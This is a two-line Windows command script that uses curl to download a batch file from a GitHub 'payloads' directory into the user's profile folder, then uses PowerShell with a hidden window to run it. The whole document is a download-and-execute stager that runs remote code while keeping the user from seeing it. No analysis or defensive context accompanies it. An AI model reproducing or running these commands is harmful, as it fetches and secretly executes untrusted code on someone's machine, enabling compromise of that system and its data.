cmd /C "curl https://raw.githubusercontent.com/BigGreenHat14/biggreenhat14.github.io/refs/heads/main/payloads/3_main.bat > %USERPROFILE%\torun.bat"
powershell -WindowStyle Hidden -Command "& { $path = Join-Path $env:USERPROFILE 'torun.bat'; Start-Process -FilePath $path }"
